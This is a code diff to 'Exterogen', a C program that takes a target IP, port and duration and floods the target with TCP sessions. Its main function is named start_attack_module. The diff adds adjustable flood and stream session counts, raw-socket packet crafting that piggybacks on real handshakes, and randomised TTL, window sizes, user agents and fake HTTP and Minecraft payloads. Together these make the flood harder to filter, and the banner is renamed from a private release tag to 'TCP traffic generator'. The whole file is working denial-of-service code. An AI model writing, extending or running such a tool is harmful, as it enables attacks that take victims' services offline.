@@ -1,7 +1,14 @@
-/*
- * Exterogen 
- * by c0redev for 0v.lol
- */
+/* Exterogen 
+by c0redev for 0v.lol
+
+Usage: sudo ./exterogen <target_ip> <port> <duration>
+Options:
+  --sndbuf <bytes>    socket SO_SNDBUF (default: 4194304)
+  --rcvbuf <bytes>    socket SO_RCVBUF (default: 4194304)
+  --window <0-65535>  base advertised tcp window (default: 65535)
+  --flood <count>     flood sessions (default: 6)
+  --stream <count>    stream sessions (default: 12)
+*/
 
 #define _GNU_SOURCE
 
@@ -23,9 +30,11 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <sys/stat.h>
-#define FLOOD_SESSIONS 6
-#define STREAM_SESSIONS 12
-#define TOTAL_SESSIONS (FLOOD_SESSIONS + STREAM_SESSIONS)
+#include <sys/select.h>
+
+#define DEFAULT_FLOOD_SESSIONS 6
+#define DEFAULT_STREAM_SESSIONS 12
+#define MAX_TOTAL_SESSIONS 2048
 #define MAX_PAYLOAD 1460
 #define STREAM_INTERVAL_US 2000
 
@@ -36,6 +45,11 @@
 #define DEFAULT_CONN_SNDBUF (4 * 1024 * 1024)
 #define DEFAULT_CONN_RCVBUF (4 * 1024 * 1024)
 #define DEFAULT_ADV_WINDOW 65535
+#define HANDSHAKE_TIMEOUT_SEC 15
+#define HANDSHAKE_ATTEMPTS 3
+#define HANDSHAKE_RETRY_US 200000
+#define TS_SYNC_INTERVAL_MS 25
+#define TS_SYNC_MAX_READS 8
 static int parse_arg_u32(const char *value, uint32_t *out, uint32_t min, uint32_t max) {
     char *end = NULL;
     unsigned long parsed;
@@ -63,6 +77,8 @@ struct exterogen_config {
     uint32_t conn_sndbuf;
     uint32_t conn_rcvbuf;
     uint16_t adv_window;
+    uint32_t flood_sessions;
+    uint32_t stream_sessions;
     uint64_t total_packets;
     uint64_t total_bytes;
     pthread_mutex_t stats_mutex;
@@ -86,9 +102,13 @@ struct session_data {
     int tcp_send_hlen;
     uint32_t ts_local;
     uint32_t ts_peer;
+    uint32_t last_ts_sync_ms;
+    uint16_t session_window;
+    uint8_t ttl;
 };
 
 static struct exterogen_config config;
+static void close_session_socket(struct session_data *sd);
 
 static void rng_init(struct rng_state *r, uint32_t seed) {
     r->s[0] = seed;
@@ -240,10 +260,19 @@ static uint32_t get_local_ip(void) {
 
 static const char *http_paths[] = {
     "/", "/index.html", "/api/v1", "/robots.txt", "/favicon.ico",
-    "/login", "/admin", "/wp-admin", "/.env", "/config"
+    "/login", "/admin", "/wp-admin", "/.env", "/config", "/health", "/status",
+    "/api/status", "/api/ping", "/upload", "/static/style.css", "/assets/logo.png"
 };
 static const char *http_hosts[] = {
-    "example.com", "localhost", "api.example.com", "cdn.d.com"
+    "example.com", "localhost", "api.example.com", "cdn.d.com", "content.example.net",
+    "assets.example.org", "web.example.io", "app.example.local"
+};
+static const char *http_user_agents[] = {
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+    "curl/8.5.0",
+    "python-requests/2.32.3"
 };
 
 static int clamp_payload_len(int len, int max_len) {
@@ -272,20 +301,23 @@ static int gen_http_payload(struct rng_state *rng, char *buf, int max_len) {
 
     int path_idx = rng_next(rng) % (int)(sizeof(http_paths) / sizeof(http_paths[0]));
     int host_idx = rng_next(rng) % (int)(sizeof(http_hosts) / sizeof(http_hosts[0]));
+    int ua_idx = rng_next(rng) % (int)(sizeof(http_user_agents) / sizeof(http_user_agents[0]));
     int method = (int)(rng_next(rng) % 3);
     int n;
     int payload_len = payload_len_from_rng(rng, max_len);
     int tail;
+    const char *ua = http_user_agents[ua_idx];
 
     if (method == 0)
-        n = snprintf(buf, (size_t)max_len, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
-                     http_paths[path_idx], http_hosts[host_idx]);
+        n = snprintf(buf, (size_t)max_len, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
+                     http_paths[path_idx], http_hosts[host_idx], ua);
     else if (method == 1)
-        n = snprintf(buf, (size_t)max_len, "POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %u\r\n\r\n",
-                     http_paths[path_idx], http_hosts[host_idx], (unsigned int)(rng_next(rng) % 1024));
+        n = snprintf(buf, (size_t)max_len, "POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Length: %u\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n",
+                     http_paths[path_idx], http_hosts[host_idx], ua,
+                     (unsigned int)(rng_next(rng) % 1024));
     else
-        n = snprintf(buf, (size_t)max_len, "HEAD %s HTTP/1.1\r\nHost: %s\r\n\r\n",
-                     http_paths[path_idx], http_hosts[host_idx]);
+        n = snprintf(buf, (size_t)max_len, "HEAD %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n",
+                     http_paths[path_idx], http_hosts[host_idx], ua);
 
     if (n < 0) n = 0;
     if (n > max_len) n = max_len;
@@ -319,7 +351,7 @@ static int gen_minecraft_payload(struct rng_state *rng, char *buf, int max_len) 
     } while (ver);
 
     if (len >= max_len) return max_len;
-    const char *addr = "localhost";
+    const char *addr = http_hosts[rng_next(rng) % (int)(sizeof(http_hosts) / sizeof(http_hosts[0]))];
     int addr_len = (int)strlen(addr);
     buf[len++] = (char)addr_len;
 
@@ -367,97 +399,123 @@ static int gen_payload(struct rng_state *rng, char *buf, int max_len) {
 }
 
 static int do_handshake(struct session_data *sd) {
-    int conn_sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (conn_sock < 0) return -1;
-    sd->conn_sock = conn_sock;
-    if (fcntl(conn_sock, F_SETFL, fcntl(conn_sock, F_GETFL, 0) | O_NONBLOCK) < 0) {
-        close(conn_sock);
-        sd->conn_sock = -1;
-        return -1;
-    }
+    for (int attempt = 0; attempt < HANDSHAKE_ATTEMPTS && config.running; attempt++) {
+        int conn_sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (conn_sock < 0) return -1;
+        sd->conn_sock = conn_sock;
 
-    int on = 1;
-    if (setsockopt(conn_sock, IPPROTO_TCP, TCP_NODELAY, &on, sizeof(on)) < 0) {
-        fprintf(stderr, "[Session %d] TCP_NODELAY failed: %s\n", sd->session_id, strerror(errno));
-    }
-
-    if (config.conn_sndbuf > 0) {
-        int sndbuf = (int)config.conn_sndbuf;
-        if (setsockopt(conn_sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) {
-            fprintf(stderr, "[Session %d] SO_SNDBUF(%u) failed: %s\n", sd->session_id, config.conn_sndbuf, strerror(errno));
-        }
-    }
-
-    if (config.conn_rcvbuf > 0) {
-        int rcvbuf = (int)config.conn_rcvbuf;
-        if (setsockopt(conn_sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0) {
-            fprintf(stderr, "[Session %d] SO_RCVBUF(%u) failed: %s\n", sd->session_id, config.conn_rcvbuf, strerror(errno));
-        }
-    }
-
-    struct sockaddr_in target_addr;
-    target_addr.sin_family = AF_INET;
-    target_addr.sin_addr.s_addr = config.target_addr;
-    target_addr.sin_port = htons(config.target_port);
-    int connect_rc = connect(conn_sock, (struct sockaddr *)&target_addr, sizeof(target_addr));
-    if (connect_rc < 0) {
-        if (errno != EINPROGRESS && errno != EWOULDBLOCK && errno != EINTR) {
+        int f = fcntl(conn_sock, F_GETFL, 0);
+        if (f < 0 || fcntl(conn_sock, F_SETFL, f | O_NONBLOCK) < 0) {
             close(conn_sock);
             sd->conn_sock = -1;
             return -1;
         }
-    }
 
-    time_t start = time(NULL);
-    int done = 0;
-    uint16_t expected_sport = 0;
-    struct sockaddr_in conn_addr;
-    socklen_t conn_len = sizeof(conn_addr);
+        int on = 1;
+        if (setsockopt(conn_sock, IPPROTO_TCP, TCP_NODELAY, &on, sizeof(on)) < 0) {
+            fprintf(stderr, "[Session %d] TCP_NODELAY failed: %s\n", sd->session_id, strerror(errno));
+        }
 
-    if (getsockname(conn_sock, (struct sockaddr *)&conn_addr, &conn_len) == 0)
-        expected_sport = conn_addr.sin_port;
+        if (config.conn_sndbuf > 0) {
+            int sndbuf = (int)config.conn_sndbuf;
+            if (setsockopt(conn_sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) {
+                fprintf(stderr, "[Session %d] SO_SNDBUF(%u) failed: %s\n", sd->session_id, config.conn_sndbuf, strerror(errno));
+            }
+        }
 
-    while (time(NULL) - start < 10 && config.running) {
-        char recv_buf[256];
-        struct iphdr *iph;
-        struct tcphdr *tcph;
-        int ip_hl;
-        struct sockaddr_in recv_addr;
-        socklen_t recv_len = sizeof(recv_addr);
-        int ret = recvfrom(sd->raw_sock, recv_buf, sizeof(recv_buf), MSG_DONTWAIT,
-                          (struct sockaddr *)&recv_addr, &recv_len);
-        if (ret > (int)(sizeof(struct iphdr) + sizeof(struct tcphdr)) &&
-            recv_addr.sin_addr.s_addr == config.target_addr) {
+        if (config.conn_rcvbuf > 0) {
+            int rcvbuf = (int)config.conn_rcvbuf;
+            if (setsockopt(conn_sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0) {
+                fprintf(stderr, "[Session %d] SO_RCVBUF(%u) failed: %s\n", sd->session_id, config.conn_rcvbuf, strerror(errno));
+            }
+        }
+
+        struct sockaddr_in target_addr;
+        target_addr.sin_family = AF_INET;
+        target_addr.sin_addr.s_addr = config.target_addr;
+        target_addr.sin_port = htons(config.target_port);
+        int connect_rc = connect(conn_sock, (struct sockaddr *)&target_addr, sizeof(target_addr));
+        if (connect_rc < 0) {
+            if (errno != EINPROGRESS && errno != EWOULDBLOCK && errno != EINTR) {
+                close(conn_sock);
+                sd->conn_sock = -1;
+                return -1;
+            }
+        }
+
+        time_t start = time(NULL);
+        int done = 0;
+        uint16_t expected_sport = 0;
+        struct sockaddr_in conn_addr;
+        socklen_t conn_len = sizeof(conn_addr);
+
+        if (getsockname(conn_sock, (struct sockaddr *)&conn_addr, &conn_len) == 0)
+            expected_sport = conn_addr.sin_port;
+
+        while (time(NULL) - start < HANDSHAKE_TIMEOUT_SEC && config.running) {
+            char recv_buf[576];
+            struct iphdr *iph;
+            struct tcphdr *tcph;
+            int ip_hl;
+            struct sockaddr_in recv_addr;
+            socklen_t recv_len = sizeof(recv_addr);
+            fd_set rfds;
+            struct timeval tv;
+
+            FD_ZERO(&rfds);
+            FD_SET(sd->raw_sock, &rfds);
+            tv.tv_sec = 0;
+            tv.tv_usec = 150000;
+
+            int sel = select(sd->raw_sock + 1, &rfds, NULL, NULL, &tv);
+            if (sel <= 0)
+                continue;
+
+            int ret = recvfrom(sd->raw_sock, recv_buf, sizeof(recv_buf), MSG_DONTWAIT,
+                              (struct sockaddr *)&recv_addr, &recv_len);
+            if (ret <= (int)(sizeof(struct iphdr) + sizeof(struct tcphdr)) ||
+                recv_addr.sin_addr.s_addr != config.target_addr) {
+                continue;
+            }
 
             iph = (struct iphdr *)recv_buf;
             ip_hl = iph->ihl * 4;
-            if (ip_hl >= (int)sizeof(struct iphdr) && iph->protocol == IPPROTO_TCP) {
-
-                tcph = (struct tcphdr *)(recv_buf + ip_hl);
-                int tcp_bytes = (int)tcph->doff * 4;
-
-                if (ret >= ip_hl + tcp_bytes &&
-                    tcph->source == htons(config.target_port) &&
-                    (expected_sport == 0 || tcph->dest == expected_sport) &&
-                    tcph->syn && tcph->ack) {
-
-                    sd->seq = ntohl(tcph->ack_seq);
-                    sd->ack_seq = ntohl(tcph->seq) + 1;
-                    sd->sport = tcph->dest;
-                    sd->dport = tcph->source;
-                    sd->use_ts = 0;
-                    if (tcp_opts_get_tsval(tcph, ret - ip_hl, &sd->ts_peer)) {
-                        sd->use_ts = 1;
-                        sd->ts_local = tcp_now_ts_ms();
-                    }
-                    done = 1;
-                    break;
-                }
+            if (ip_hl < (int)sizeof(struct iphdr) || iph->protocol != IPPROTO_TCP) {
+                continue;
             }
+
+            tcph = (struct tcphdr *)(recv_buf + ip_hl);
+            int tcp_bytes = (int)tcph->doff * 4;
+            if (ret < ip_hl + tcp_bytes ||
+                tcph->source != htons(config.target_port) ||
+                (expected_sport != 0 && tcph->dest != expected_sport) ||
+                !tcph->syn ||
+                !tcph->ack) {
+                continue;
+            }
+
+            sd->seq = ntohl(tcph->ack_seq);
+            sd->ack_seq = ntohl(tcph->seq) + 1;
+            sd->sport = tcph->dest;
+            sd->dport = tcph->source;
+            sd->use_ts = 0;
+            if (tcp_opts_get_tsval(tcph, ret - ip_hl, &sd->ts_peer)) {
+                sd->use_ts = 1;
+                sd->ts_local = tcp_now_ts_ms();
+                sd->last_ts_sync_ms = sd->ts_local;
+            }
+            done = 1;
+            break;
         }
-        usleep(5000);
+
+        if (done) return 0;
+
+        close_session_socket(sd);
+        if (attempt < HANDSHAKE_ATTEMPTS - 1)
+            usleep(HANDSHAKE_RETRY_US);
     }
-    return done ? 0 : -1;
+
+    return -1;
 }
 
 static void close_session_socket(struct session_data *sd) {
@@ -475,7 +533,24 @@ static void peer_sync_ts_from_raw(struct session_data *sd) {
     if (!sd->use_ts)
         return;
 
-    for (;;) {
+    uint32_t now = tcp_now_ts_ms();
+    if (sd->last_ts_sync_ms != 0 && now - sd->last_ts_sync_ms < TS_SYNC_INTERVAL_MS)
+        return;
+
+    sd->last_ts_sync_ms = now;
+
+    for (int i = 0; i < TS_SYNC_MAX_READS; i++) {
+        fd_set rfds;
+        struct timeval tv;
+        FD_ZERO(&rfds);
+        FD_SET(sd->raw_sock, &rfds);
+        tv.tv_sec = 0;
+        tv.tv_usec = 5000;
+
+        int sel = select(sd->raw_sock + 1, &rfds, NULL, NULL, &tv);
+        if (sel <= 0)
+            return;
+
         rlen = sizeof(ra);
         int ret = recvfrom(sd->raw_sock, buf, sizeof(buf), MSG_DONTWAIT,
                            (struct sockaddr *)&ra, &rlen);
@@ -513,24 +588,51 @@ static void peer_sync_ts_from_raw(struct session_data *sd) {
 }
 
 static int send_packet(struct session_data *sd, struct sockaddr_in *target_addr,
-                      char *packet, int pkt_size, int payload_len) {
+                      char *packet, int pkt_size, int payload_len,
+                      uint16_t flags) {
     struct iphdr *iph = (struct iphdr *)packet;
     struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
     int tcp_hlen = sd->tcp_send_hlen;
     int sent;
+    int seq_adv = payload_len;
+
+    memset(iph, 0, sizeof(struct iphdr));
+    memset(tcph, 0, (size_t)tcp_hlen);
 
     iph->id = htons((uint16_t)(rng_next(&sd->rng) & 0xFFFF));
+    if (flags & TH_SYN)
+        seq_adv += 1;
+    if (flags & TH_FIN)
+        seq_adv += 1;
+    iph->version = 4;
+    iph->ihl = 5;
+    iph->protocol = IPPROTO_TCP;
+    iph->ttl = sd->ttl;
+    iph->frag_off = (rng_next(&sd->rng) & 1) ? htons(1 << 14) : 0;
+    iph->saddr = config.local_addr;
+    iph->daddr = config.target_addr;
+    tcph->source = sd->sport;
+    tcph->dest = sd->dport;
+    tcph->window = htons(sd->session_window);
     tcph->seq = htonl(sd->seq);
     tcph->ack_seq = htonl(sd->ack_seq);
-    sd->seq += (uint32_t)payload_len;
+    sd->seq += (uint32_t)seq_adv;
 
     if (sd->use_ts) {
         tcph->doff = (uint16_t)(tcp_hlen / 4);
+        uint32_t ts = tcp_now_ts_ms();
+        if (ts <= sd->ts_local)
+            ts = sd->ts_local + 1;
+        sd->ts_local = ts;
         tcp_put_ts_opts((char *)tcph + sizeof(struct tcphdr), sd->ts_local, sd->ts_peer);
-        sd->ts_local++;
     } else {
         tcph->doff = 5;
     }
+    tcph->fin = !!(flags & TH_FIN);
+    tcph->syn = !!(flags & TH_SYN);
+    tcph->rst = !!(flags & TH_RST);
+    tcph->psh = !!(flags & TH_PUSH);
+    tcph->ack = 1;
 
     iph->tot_len = htons((uint16_t)pkt_size);
     iph->check = 0;
@@ -560,6 +662,9 @@ static void *session_thread(void *arg) {
     target_addr.sin_addr.s_addr = config.target_addr;
     target_addr.sin_port = htons(config.target_port);
     init_session_rng(sd, sd->session_id);
+    sd->last_ts_sync_ms = 0;
+    sd->ttl = (uint8_t)(64 + (rng_next(&sd->rng) % 80));
+    sd->session_window = (uint16_t)(1024 + (rng_next(&sd->rng) % (65535u - 1024u + 1)));
     sd->conn_sock = -1;
 
     sd->raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -584,6 +689,15 @@ static void *session_thread(void *arg) {
            sd->session_id, sd->seq, sd->ack_seq,
            sd->use_ts ? " ts=on" : "",
            sd->is_flood ? "[flood]" : "[stream]");
+    if (config.adv_window > 0) {
+        uint32_t jitter = rng_next(&sd->rng) % 4096u;
+        int32_t shifted = (int32_t)config.adv_window - (int32_t)jitter;
+        if (shifted < 1024)
+            shifted = 1024;
+        sd->session_window = (uint16_t)shifted;
+    }
+    if (rng_next(&sd->rng) & 1)
+        sd->ttl = 72 + (uint8_t)(rng_next(&sd->rng) % 32);
 
     int pkt_size = sizeof(struct iphdr) + TCP_HDRLEN_TS + MAX_PAYLOAD;
     char *packet = malloc((size_t)pkt_size);
@@ -600,8 +714,8 @@ static void *session_thread(void *arg) {
     iph->version = 4;
     iph->ihl = 5;
     iph->tos = 0;
-    iph->ttl = 64;
-    iph->frag_off = htons(1 << 14);
+    iph->ttl = sd->ttl;
+    iph->frag_off = (rng_next(&sd->rng) & 1) ? htons(1 << 14) : 0;
     iph->protocol = IPPROTO_TCP;
     iph->saddr = config.local_addr;
     iph->daddr = config.target_addr;
@@ -610,19 +724,18 @@ static void *session_thread(void *arg) {
     tcph->source = sd->sport;
     tcph->dest = sd->dport;
     tcph->doff = 5;
-    tcph->window = htons(config.adv_window);
-    tcph->ack = 1;
-    tcph->psh = 1;
+    tcph->window = htons(sd->session_window);
 
     time_t end_time = time(NULL) + config.duration;
     uint64_t local_pkts = 0;
+    uint32_t local_interval = STREAM_INTERVAL_US + (uint32_t)(rng_next(&sd->rng) % 4000);
 
     if (sd->is_flood) {
         while (config.running && time(NULL) < end_time) {
             peer_sync_ts_from_raw(sd);
             int plen = gen_payload(&sd->rng, payload, MAX_PAYLOAD);
             int total = sizeof(struct iphdr) + sd->tcp_send_hlen + plen;
-            if (send_packet(sd, &target_addr, packet, total, plen) > 0)
+            if (send_packet(sd, &target_addr, packet, total, plen, TH_ACK | TH_PUSH) > 0)
                 local_pkts++;
         }
     } else {
@@ -630,11 +743,15 @@ static void *session_thread(void *arg) {
             peer_sync_ts_from_raw(sd);
             int plen = gen_payload(&sd->rng, payload, MAX_PAYLOAD);
             int total = sizeof(struct iphdr) + sd->tcp_send_hlen + plen;
-            if (send_packet(sd, &target_addr, packet, total, plen) > 0)
+            if (send_packet(sd, &target_addr, packet, total, plen, TH_ACK | TH_PUSH) > 0)
                 local_pkts++;
-            usleep(STREAM_INTERVAL_US);
+            usleep(local_interval);
         }
     }
+
+    send_packet(sd, &target_addr, packet, sizeof(struct iphdr) + sd->tcp_send_hlen, 0, TH_ACK | TH_FIN);
+    usleep(5000);
+    send_packet(sd, &target_addr, packet, sizeof(struct iphdr) + sd->tcp_send_hlen, 0, TH_ACK | TH_RST);
 
     printf("[Session %d] Done, pkts=%llu\n", sd->session_id, (unsigned long long)local_pkts);
     free(packet);
@@ -650,31 +767,49 @@ static void sigint_handler(int sig) {
 }
 
 static void usage(const char *prog) {
-    printf("Exterogen Private c0redev for 0v.lol\n");
+    printf("Exterogen TCP traffic generator\n");
     printf("Usage: sudo %s <target_ip> <port> <duration>\n\n", prog);
     printf("options:\n");
     printf("  --sndbuf <bytes>    socket SO_SNDBUF (default: %u)\n", DEFAULT_CONN_SNDBUF);
     printf("  --rcvbuf <bytes>    socket SO_RCVBUF (default: %u)\n", DEFAULT_CONN_RCVBUF);
-    printf("  --window <0-65535>  advertised tcp window (default: %u)\n\n", DEFAULT_ADV_WINDOW);
+    printf("  --window <0-65535>  base advertised tcp window (default: %u)\n", DEFAULT_ADV_WINDOW);
+    printf("  --flood <count>     flood sessions (default: %u)\n", DEFAULT_FLOOD_SESSIONS);
+    printf("  --stream <count>    stream sessions (default: %u)\n\n", DEFAULT_STREAM_SESSIONS);
 }
 
 static int start_attack_module(void) {
     signal(SIGINT, sigint_handler);
     signal(SIGTERM, sigint_handler);
 
-    printf("\nExterogen - %d flood + %d stream sessions\n", FLOOD_SESSIONS, STREAM_SESSIONS);
+    uint32_t total_sessions = config.flood_sessions + config.stream_sessions;
+    if (total_sessions == 0) {
+        fprintf(stderr, "Error: session count must be at least 1\n");
+        return 1;
+    }
+    if (total_sessions > MAX_TOTAL_SESSIONS) {
+        fprintf(stderr, "Error: too many sessions, max %u\n", MAX_TOTAL_SESSIONS);
+        return 1;
+    }
+
+    printf("\nExterogen - %u flood + %u stream sessions\n", config.flood_sessions, config.stream_sessions);
     printf("target: %s:%d, duration: %u sec\n\n", config.target_ip, config.target_port, config.duration);
     printf("session sockets: sndbuf=%u, rcvbuf=%u, advertised window=%u\n\n",
            config.conn_sndbuf, config.conn_rcvbuf, config.adv_window);
 
-    struct session_data sessions[TOTAL_SESSIONS];
-    pthread_t threads[TOTAL_SESSIONS];
+    struct session_data *sessions = calloc((size_t)total_sessions, sizeof(*sessions));
+    pthread_t *threads = calloc((size_t)total_sessions, sizeof(*threads));
+    if (!sessions || !threads) {
+        fprintf(stderr, "Error: failed to allocate session arrays\n");
+        free(sessions);
+        free(threads);
+        return 1;
+    }
 
     int started = 0;
-    for (int i = 0; i < TOTAL_SESSIONS; i++) {
+    for (uint32_t i = 0; i < total_sessions; i++) {
         memset(&sessions[i], 0, sizeof(sessions[i]));
         sessions[i].session_id = i + 1;
-        sessions[i].is_flood = (i < FLOOD_SESSIONS);
+        sessions[i].is_flood = (i < config.flood_sessions);
         if (pthread_create(&threads[i], NULL, session_thread, &sessions[i]) == 0)
             started++;
         else
@@ -685,6 +820,8 @@ static int start_attack_module(void) {
     for (int i = 0; i < started; i++)
         pthread_join(threads[i], NULL);
 
+    free(sessions);
+    free(threads);
     printf("\n[*] Done\n");
     printf("    Packets: %llu\n", (unsigned long long)config.total_packets);
     printf("    Bytes: %.2f MB\n", config.total_bytes / 1024.0 / 1024.0);
@@ -725,6 +862,8 @@ int main(int argc, char **argv) {
     config.conn_sndbuf = DEFAULT_CONN_SNDBUF;
     config.conn_rcvbuf = DEFAULT_CONN_RCVBUF;
     config.adv_window = DEFAULT_ADV_WINDOW;
+    config.flood_sessions = DEFAULT_FLOOD_SESSIONS;
+    config.stream_sessions = DEFAULT_STREAM_SESSIONS;
 
     for (int i = 4; i < argc; i++) {
         if (strcmp(argv[i], "--sndbuf") == 0 && i + 1 < argc) {
@@ -756,6 +895,26 @@ int main(int argc, char **argv) {
             config.adv_window = (uint16_t)value;
         } else if (strcmp(argv[i], "--window") == 0) {
             fprintf(stderr, "Error: Missing --window value\n");
+            return 1;
+        } else if (strcmp(argv[i], "--flood") == 0 && i + 1 < argc) {
+            uint32_t value = 0;
+            if (parse_arg_u32(argv[++i], &value, 1, MAX_TOTAL_SESSIONS) < 0) {
+                fprintf(stderr, "Error: Invalid --flood value\n");
+                return 1;
+            }
+            config.flood_sessions = value;
+        } else if (strcmp(argv[i], "--flood") == 0) {
+            fprintf(stderr, "Error: Missing --flood value\n");
+            return 1;
+        } else if (strcmp(argv[i], "--stream") == 0 && i + 1 < argc) {
+            uint32_t value = 0;
+            if (parse_arg_u32(argv[++i], &value, 0, MAX_TOTAL_SESSIONS) < 0) {
+                fprintf(stderr, "Error: Invalid --stream value\n");
+                return 1;
+            }
+            config.stream_sessions = value;
+        } else if (strcmp(argv[i], "--stream") == 0) {
+            fprintf(stderr, "Error: Missing --stream value\n");
             return 1;
         } else {
             fprintf(stderr, "Error: Unknown argument %s\n", argv[i]);
